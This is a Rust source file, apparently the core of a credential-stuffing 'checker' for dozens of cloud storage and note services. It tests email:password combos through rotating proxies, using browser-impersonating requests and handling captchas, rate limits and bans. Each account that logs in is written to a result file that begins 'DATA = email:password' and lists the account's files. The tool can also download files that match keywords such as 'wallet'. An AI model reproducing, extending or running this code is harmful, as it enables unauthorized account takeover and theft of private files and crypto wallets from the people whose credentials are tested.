//! Shared cloud checker pipeline (MEGA v4.3-style inventory + stats).

use super::config::CloudClientConfig;
use super::dispatch_download;
use super::CheckStartedHook;
use super::CloudAccountStats;
use anyhow::{anyhow, Context, Result};
use pma_core::{output_file_path_in_bucket, CloudDownloadFilter, Credential, ScanStatus};
use reqwest::Client;
use sha2::{Digest, Sha256};
use std::future::Future;
use std::path::{Path, PathBuf};
use tokio::fs;

pub const CONTENTS_DIR: &str = "Содержимое";
pub const MAX_CLOUD_LIST_LINES: usize = 20_000;

// #region agent log
pub fn cloud_debug_log(hypothesis_id: &str, location: &str, message: &str, data: serde_json::Value) {
    use std::fs::OpenOptions;
    use std::io::Write;
    let line = serde_json::json!({
        "sessionId": "be3b27",
        "hypothesisId": hypothesis_id,
        "location": location,
        "message": message,
        "data": data,
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis())
            .unwrap_or(0),
        "runId": "cloud-check",
    });
    if let Ok(mut f) = OpenOptions::new()
        .create(true)
        .append(true)
        .open(r"C:\Users\beakd\Documents\MEGA\1\debug-be3b27.log")
    {
        let _ = writeln!(f, "{line}");
    }
}
// #endregion

#[derive(Debug, Clone)]
pub struct CloudFileMeta {
    pub name: String,
    pub size: u64,
    /// Full path for keyword matching (folders + name).
    pub path: String,
    /// Provider-specific id (MEGA handle, MediaFire quickkey, PixelDrain id, …).
    pub remote_id: Option<String>,
    /// Extra text for keyword filter only (not written to «Содержимое» list).
    pub keyword_extra: String,
}

impl CloudFileMeta {
    pub fn new(name: impl Into<String>, size: u64, path: impl Into<String>) -> Self {
        let name = name.into();
        let path = path.into();
        Self {
            name,
            size,
            path,
            remote_id: None,
            keyword_extra: String::new(),
        }
    }

    pub fn with_remote_id(mut self, id: impl Into<String>) -> Self {
        self.remote_id = Some(id.into());
        self
    }

    pub fn with_keyword_extra(mut self, text: impl Into<String>) -> Self {
        self.keyword_extra = text.into();
        self
    }
}

#[derive(Debug, Clone)]
pub struct CloudInventory {
    pub files: Vec<CloudFileMeta>,
    pub file_count: usize,
    pub total_bytes: u64,
    pub used_bytes: u64,
    pub quota_bytes: u64,
    pub account_tag_source: String,
    pub tariff: String,
    pub list_note: Option<String>,
    /// Opaque session (e.g. MediaFire session_token) for post-login downloads.
    pub session_secret: Option<String>,
}

impl CloudInventory {
    pub fn from_files(
        account_tag_source: impl Into<String>,
        files: Vec<CloudFileMeta>,
        used_bytes: u64,
        quota_bytes: u64,
        tariff: impl Into<String>,
    ) -> Self {
        let file_count = files.len();
        let total_bytes: u64 = files.iter().map(|f| f.size).sum();
        Self {
            files,
            file_count,
            total_bytes,
            used_bytes,
            quota_bytes,
            account_tag_source: account_tag_source.into(),
            tariff: tariff.into(),
            list_note: None,
            session_secret: None,
        }
    }

    pub fn sorted_file_names(&self) -> Vec<String> {
        self.sorted_list_lines()
    }

    /// Lines for `Содержимое/*.txt` — prefer full `path` when it differs from the leaf name.
    pub fn sorted_list_lines(&self) -> Vec<String> {
        let mut lines: Vec<String> = self
            .files
            .iter()
            .map(|f| {
                if !f.path.is_empty() && f.path != f.name {
                    f.path.clone()
                } else {
                    f.name.clone()
                }
            })
            .collect();
        lines.sort_unstable();
        lines.dedup();
        lines
    }

    /// Keep only files matching the download filter (extensions, size, keywords).
    pub fn filtered_by(&self, filter: &CloudDownloadFilter) -> Self {
        if !filter.is_active() {
            return self.clone();
        }
        let files: Vec<CloudFileMeta> = self
            .files
            .iter()
            .filter(|f| {
                filter.matches_parts(&f.path, &f.name, &f.keyword_extra, f.size)
            })
            .cloned()
            .collect();
        let mut out = CloudInventory::from_files(
            &self.account_tag_source,
            files,
            self.used_bytes,
            self.quota_bytes,
            &self.tariff,
        );
        out.list_note = self.list_note.clone();
        out.session_secret = self.session_secret.clone();
        out
    }
}

fn password_mode_label(password: &str) -> &'static str {
    let s = password.trim();
    if s.contains(':') {
        "prefixed"
    } else if s.len() > 48 {
        "long_plain"
    } else {
        "plain"
    }
}

pub fn cloud_auth_error(msg: impl Into<String>) -> anyhow::Error {
    anyhow!("cloud auth: {}", msg.into())
}

pub fn cloud_banned_error(msg: impl Into<String>) -> anyhow::Error {
    anyhow!("cloud banned: {}", msg.into())
}

pub fn cloud_rate_limit_error(msg: impl Into<String>) -> anyhow::Error {
    anyhow!("cloud rate limit: {}", msg.into())
}

pub fn cloud_captcha_error(msg: impl Into<String>) -> anyhow::Error {
    anyhow!("cloud captcha: {}", msg.into())
}

pub fn cloud_network_error(msg: impl Into<String>) -> anyhow::Error {
    anyhow!("cloud network: {}", msg.into())
}

/// Combo/format mismatch (not a failed login attempt — e.g. token-only providers).
pub fn cloud_format_error(msg: impl Into<String>) -> anyhow::Error {
    anyhow!("cloud format: {}", msg.into())
}

pub fn scan_status_for_cloud_anyhow(err: &anyhow::Error) -> ScanStatus {
    let text = format!("{err:#}").to_lowercase();
    if text.contains("cloud format:") {
        return ScanStatus::Error;
    }
    if text.contains("cloud auth:") {
        return ScanStatus::InvalidCredentials;
    }
    if text.contains("cloud captcha:") {
        return ScanStatus::Captcha;
    }
    if text.contains("cloud network:") {
        return ScanStatus::Unreachable;
    }
    if text.contains("cloud rate limit:") {
        return ScanStatus::Unreachable;
    }
    if text.contains("cloud banned:") {
        return ScanStatus::Error;
    }
    if text.contains("not implemented") {
        return ScanStatus::Error;
    }
    if text.contains("timeout")
        || text.contains("connect")
        || text.contains("dns")
        || text.contains("curl-impersonate")
        || text.contains(" over proxy ")
        || text.contains("socks5")
        || text.contains("ssl certificate")
        || text.contains("could not connect")
        || text.contains("connection was reset")
        || text.contains("ssl_connect")
        || text.contains("ssl_error")
        || text.contains("boringssl")
    {
        return ScanStatus::Unreachable;
    }
    ScanStatus::Error
}

/// Another proxy may succeed (dead SOCKS, IP rate limit, WAF on one exit).
pub fn cloud_retryable_with_other_proxy(err: &anyhow::Error) -> bool {
    match scan_status_for_cloud_anyhow(err) {
        ScanStatus::Unreachable => true,
        ScanStatus::InvalidCredentials | ScanStatus::Captcha | ScanStatus::NotPhpMyAdmin => false,
        ScanStatus::Valid => false,
        ScanStatus::Error => {
            let t = format!("{err:#}").to_lowercase();
            t.contains("cloud rate limit:")
        }
    }
}

pub fn contents_tag(source: &str) -> String {
    let digest = Sha256::digest(source.as_bytes());
    format!(
        "{:02X}{:02X}{:02X}{:02X}",
        digest[0], digest[1], digest[2], digest[3]
    )
}

fn format_bytes_v43(bytes: u64) -> String {
    if bytes == 0 {
        return "0.00 Б".to_string();
    }
    const GB: f64 = 1024.0 * 1024.0 * 1024.0;
    const MB: f64 = 1024.0 * 1024.0;
    const KB: f64 = 1024.0;
    let gb = bytes as f64 / GB;
    if gb >= 1.0 {
        return format!("{gb:.2} ГБ");
    }
    let mb = bytes as f64 / MB;
    if mb >= 1.0 {
        return format!("{mb:.2} МБ");
    }
    let kb = bytes as f64 / KB;
    format!("{kb:.2} КБ")
}

fn resolve_used_quota(inv: &CloudInventory, quota_fallback_bytes: u64) -> (u64, u64) {
    let mut quota = inv.quota_bytes;
    if quota == 0 && quota_fallback_bytes > 0 {
        quota = quota_fallback_bytes;
    }
    let mut used = inv.used_bytes;
    if used == 0 && inv.total_bytes > 0 {
        used = inv.total_bytes.min(quota);
    }
    (used, quota)
}

fn default_free_quota_bytes(provider: pma_core::CloudProvider) -> u64 {
    const GB: u64 = 1024 * 1024 * 1024;
    match provider {
        pma_core::CloudProvider::Mega => 20 * GB,
        pma_core::CloudProvider::FourShared => 15 * GB,
        pma_core::CloudProvider::Filen => 10 * GB,
        pma_core::CloudProvider::Degoo => 20 * GB,
        pma_core::CloudProvider::Mediafire => 10 * GB,
        pma_core::CloudProvider::Blomp => 20 * GB,
        pma_core::CloudProvider::Filesfm => 10 * GB,
        pma_core::CloudProvider::Adrive => 50 * GB,
        pma_core::CloudProvider::Terabox => 1024 * GB,
        pma_core::CloudProvider::PixelDrain => 10 * GB,
        pma_core::CloudProvider::Raindrop => 0,
        pma_core::CloudProvider::InternXt => 10 * GB,
        pma_core::CloudProvider::Remnote => 0,
        pma_core::CloudProvider::OneDrive => 5 * GB,
        pma_core::CloudProvider::Wps => 20 * GB,
        pma_core::CloudProvider::SyncCom => 5 * GB,
        pma_core::CloudProvider::Acronis => 0,
        pma_core::CloudProvider::ZohoNotes => 0,
        pma_core::CloudProvider::Obsidian => 0,
        pma_core::CloudProvider::NimbusNotes => 0,
        pma_core::CloudProvider::Dynalist
        | pma_core::CloudProvider::Capacities
        | pma_core::CloudProvider::Gnotes
        | pma_core::CloudProvider::Joplin
        | pma_core::CloudProvider::Kortex
        | pma_core::CloudProvider::Mindlog
        | pma_core::CloudProvider::Notejoy
        | pma_core::CloudProvider::Notesnook
        | pma_core::CloudProvider::StandardNotes
        | pma_core::CloudProvider::Todoist
        | pma_core::CloudProvider::Turtl
        | pma_core::CloudProvider::Zotero => 0,
        pma_core::CloudProvider::ProtonDrive => 0,
        pma_core::CloudProvider::Koofr => 10 * GB,
        pma_core::CloudProvider::Upnote => 0,
        pma_core::CloudProvider::BoxCom => 10 * GB,
        pma_core::CloudProvider::Fex => 50 * GB,
        pma_core::CloudProvider::FileIo => 0,
        pma_core::CloudProvider::Icedrive => 10 * GB,
        pma_core::CloudProvider::Mobidrive => 20 * GB,
        pma_core::CloudProvider::SecureShare => 0,
        pma_core::CloudProvider::ToffeeShare => 0,
        pma_core::CloudProvider::Workupload => 0,
        pma_core::CloudProvider::Pcloud => 10 * GB,
        pma_core::CloudProvider::Riseup => 0,
    }
}

/// Parse `"fieldName":12345` from HTML/JSON embedded in a page.
pub fn parse_embedded_json_u64(body: &str, field: &str) -> Option<u64> {
    let pattern = format!(r#""{field}"\s*:\s*(\d+)"#);
    let re = regex::Regex::new(&pattern).ok()?;
    re.captures(body)?
        .get(1)?
        .as_str()
        .parse()
        .ok()
}

pub fn parse_embedded_json_string(body: &str, field: &str) -> Option<String> {
    let pattern = format!(r#""{field}"\s*:\s*"([^"]+)""#);
    let re = regex::Regex::new(&pattern).ok()?;
    re.captures(body)?.get(1).map(|m| m.as_str().to_string())
}

/// Collect leaf file names from a WebDAV multistatus PROPFIND response.
pub fn parse_webdav_file_names(xml: &str) -> Vec<String> {
    let mut out = Vec::new();
    let lower = xml.to_ascii_lowercase();
    for tag in ["<d:displayname>", "<displayname>"] {
        let end_tags = ["</d:displayname>", "</displayname>"];
        let mut rest = lower.as_str();
        let orig = xml;
        while let Some(start) = rest.find(tag) {
            let content_start = start + tag.len();
            if let Some(rel_end) = rest[content_start..]
                .find(end_tags[0])
                .or_else(|| rest[content_start..].find(end_tags[1]))
            {
                let abs_start = orig.len() - rest.len() + content_start;
                let abs_end = abs_start + rel_end;
                if abs_end <= orig.len() {
                    let name = orig[abs_start..abs_end].trim();
                    if !name.is_empty()
                        && !name.eq_ignore_ascii_case("webdav.php")
                        && name.contains('.')
                    {
                        out.push(name.to_string());
                    }
                }
            }
            rest = &rest[content_start..];
        }
    }
    if out.is_empty() {
        for href in webdav_href_paths(xml) {
            let leaf = href.trim_matches('/').rsplit('/').next().unwrap_or("");
            if !leaf.is_empty() && leaf.contains('.') {
                out.push(leaf.to_string());
            }
        }
    }
    out
}

fn webdav_href_paths(xml: &str) -> Vec<String> {
    let mut paths = Vec::new();
    let mut search = xml;
    while let Some(i) = search.find("<D:href>").or_else(|| search.find("<d:href>")) {
        let open = if search[i..].starts_with("<D:href>") {
            "<D:href>"
        } else {
            "<d:href>"
        };
        let close = if open.contains('D') {
            "</D:href>"
        } else {
            "</d:href>"
        };
        let start = i + open.len();
        if let Some(j) = search[start..].find(close) {
            let href = search[start..start + j].trim();
            if !href.is_empty() {
                paths.push(href.to_string());
            }
            search = &search[start + j..];
        } else {
            break;
        }
    }
    paths
}

pub fn inventory_from_account(
    email: &str,
    files: Vec<CloudFileMeta>,
    used_bytes: u64,
    quota_bytes: u64,
    tariff: impl Into<String>,
) -> CloudInventory {
    CloudInventory::from_files(email, files, used_bytes, quota_bytes, tariff)
}

fn contents_leaf_filename(file_count: usize, email: &str, tag: &str) -> String {
    format!("{file_count}_FILES_{email}_{tag}.txt")
}

pub async fn write_contents_inventory(
    output_dir: &Path,
    email: &str,
    password: &str,
    inv: &CloudInventory,
) -> Result<PathBuf> {
    write_contents_inventory_for_provider(output_dir, email, password, inv, None).await
}

pub async fn write_contents_inventory_for_provider(
    output_dir: &Path,
    email: &str,
    password: &str,
    inv: &CloudInventory,
    provider: Option<pma_core::CloudProvider>,
) -> Result<PathBuf> {
    let quota_fallback = provider
        .map(default_free_quota_bytes)
        .unwrap_or(20 * 1024 * 1024 * 1024);
    let (used, quota) = resolve_used_quota(inv, quota_fallback);
    let tag = contents_tag(&inv.account_tag_source);
    let leaf = contents_leaf_filename(inv.file_count, email, &tag);
    let list_path = output_file_path_in_bucket(output_dir, &leaf, CONTENTS_DIR);
    if let Some(parent) = list_path.parent() {
        fs::create_dir_all(parent).await?;
    }
    let quota_line = format!(
        "{}/{}",
        format_bytes_v43(used),
        format_bytes_v43(quota)
    );
    let mut body = format!(
        "DATA = {email}:{password} | FILES = {} | USED QUOTA = {quota_line} | TARIFF = {}\n\n\n",
        inv.file_count, inv.tariff
    );
    if let Some(note) = &inv.list_note {
        body.push_str(note);
        body.push('\n');
    }
    let names = inv.sorted_list_lines();
    if names.len() < inv.file_count {
        body.push_str(&format!(
            "# listed {} of {} files (cap {})\n",
            names.len(),
            inv.file_count,
            MAX_CLOUD_LIST_LINES
        ));
    }
    for name in names.iter().take(MAX_CLOUD_LIST_LINES) {
        body.push_str(name);
        body.push('\n');
    }
    fs::write(&list_path, body).await?;
    Ok(list_path)
}

pub async fn run_checker<F, Fut>(
    cfg: &CloudClientConfig,
    cred: &Credential,
    output_dir: &Path,
    on_check_started: Option<CheckStartedHook>,
    check_fn: F,
) -> Result<(CloudAccountStats, Vec<PathBuf>)>
where
    F: FnOnce(Client, Credential) -> Fut,
    Fut: Future<Output = Result<CloudInventory>>,
{
    let email = cred.username.clone();
    let password = cred.password.clone();
    let _login_slot = cfg
        .login_semaphore
        .acquire()
        .await
        .context("cloud login semaphore")?;
    if let Some(hook) = on_check_started {
        hook();
    }
    let client = cfg.http.clone();
    let t0 = std::time::Instant::now();
    cloud_debug_log(
        "H1",
        "common::run_checker",
        "check start",
        serde_json::json!({
            "provider": cfg.provider.label(),
            "user_len": email.len(),
            "pass_mode": password_mode_label(&password),
        }),
    );
    let inv = match check_fn(client.clone(), cred.clone()).await {
        Ok(inv) => inv,
        Err(err) => {
            cloud_debug_log(
                "H2",
                "common::run_checker",
                "check err",
                serde_json::json!({
                    "provider": cfg.provider.label(),
                    "ms": t0.elapsed().as_millis(),
                    "err": format!("{err:#}").chars().take(240).collect::<String>(),
                }),
            );
            return Err(err);
        }
    };
    cloud_debug_log(
        "H3",
        "common::run_checker",
        "check ok",
        serde_json::json!({
            "provider": cfg.provider.label(),
            "ms": t0.elapsed().as_millis(),
            "files": inv.file_count,
        }),
    );
    let total_before_filter = inv.file_count;
    let mut inv_list = inv.filtered_by(&cfg.download_filter);
    if cfg.download_filter.is_active() && inv_list.file_count < total_before_filter {
        let note = format!(
            "# filter: listed {} of {} items (extensions/size/keywords)\n",
            inv_list.file_count, total_before_filter
        );
        inv_list.list_note = Some(match inv_list.list_note {
            Some(prev) => format!("{prev}{note}"),
            None => note,
        });
    }
    let mut written = Vec::new();
    let list_path = write_contents_inventory_for_provider(
        output_dir,
        &email,
        &password,
        &inv_list,
        Some(cfg.provider),
    )
    .await?;
    written.push(list_path);

    let mut downloaded_files = 0usize;
    let mut downloaded_bytes = 0u64;
    if cfg.download_from_cloud {
        let (n, b, paths) =
            dispatch_download::download_filtered(cfg, client, cred, output_dir, &inv).await?;
        downloaded_files = n;
        downloaded_bytes = b;
        written.extend(paths);
    }

    let stats = CloudAccountStats {
        email: email.clone(),
        used_bytes: inv.used_bytes,
        total_bytes: inv.quota_bytes,
        cloud_file_count: inv.file_count,
        cloud_bytes: inv.total_bytes,
        uploaded_files: 0,
        uploaded_bytes: 0,
        downloaded_files,
        downloaded_bytes,
    };
    Ok((stats, written))
}

#[cfg(test)]
mod filter_tests {
    use super::*;
    use pma_core::CloudDownloadFilter;

    #[test]
    fn inventory_filtered_by_keywords() {
        let files = vec![
            CloudFileMeta::new("a.txt", 100, "docs/a.txt"),
            CloudFileMeta::new("wallet.pdf", 200, "backup/wallet.pdf"),
        ];
        let inv = CloudInventory::from_files("u@x.com", files, 0, 0, "Test");
        let filter = CloudDownloadFilter {
            keywords: vec!["wallet".into()],
            ..CloudDownloadFilter::default()
        };
        let out = inv.filtered_by(&filter);
        assert_eq!(out.file_count, 1);
        assert_eq!(out.files[0].name, "wallet.pdf");
    }
}

pub fn json_api_headers(cfg: &CloudClientConfig, referer: Option<&str>) -> reqwest::header::HeaderMap {
    use reqwest::header::{HeaderValue, ACCEPT, CONTENT_TYPE};
    let mut headers = super::config::cloud_browser_headers(cfg.provider, referer);
    headers.insert(ACCEPT, HeaderValue::from_static("application/json"));
    headers.insert(
        CONTENT_TYPE,
        HeaderValue::from_static("application/json"),
    );
    headers
}
